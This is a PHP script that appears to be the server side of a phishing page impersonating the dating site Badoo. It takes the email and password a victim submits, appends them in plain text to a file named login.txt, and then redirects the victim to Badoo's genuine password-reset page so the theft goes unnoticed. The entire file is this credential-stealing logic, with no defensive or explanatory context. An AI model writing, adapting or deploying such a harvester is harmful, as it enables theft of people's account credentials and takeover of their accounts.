<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';

    $log = "Badoo Username: $email | Pass: $password\n";

    file_put_contents("login.txt", $log, FILE_APPEND);

    header('Location: https://badoo.com/forgot/');
    exit();
}
?>
